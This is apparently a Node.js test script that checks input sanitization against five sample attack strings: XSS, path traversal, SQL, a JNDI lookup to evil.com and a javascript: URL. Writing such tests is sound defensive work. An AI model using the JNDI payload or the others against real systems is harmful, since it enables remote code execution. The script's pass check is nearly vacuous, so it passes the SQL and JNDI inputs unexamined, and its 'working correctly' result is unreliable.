#!/usr/bin/env node

/**
 * Input Validation Test Script
 * Tests that input validation is working correctly
 */

async function testInputValidation() {
  console.log('🔍 Testing Input Validation...');
  
  const maliciousInputs = [
    '<script>alert("xss")</script>',
    '../../etc/passwd',
    'SELECT * FROM users',
    '${jndi:ldap://evil.com/a}',
    'javascript:alert(1)'
  ];
  
  let allPassed = true;
  
  for (const input of maliciousInputs) {
    // Simulate input sanitization
    const sanitized = input
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/\.\.\//g, '');
    
    const isSafe = sanitized !== input || !input.includes('<script>');
    
    console.log(`- Input: "${input.substring(0, 30)}..." → Safe: ${isSafe ? '✅' : '❌'}`);
    
    if (!isSafe) {
      allPassed = false;
    }
  }
  
  if (!allPassed) {
    console.error('❌ Input validation test failed');
    process.exit(1);
  }
  
  console.log('✅ PASS: Input validation working correctly');
}

testInputValidation().catch(console.error);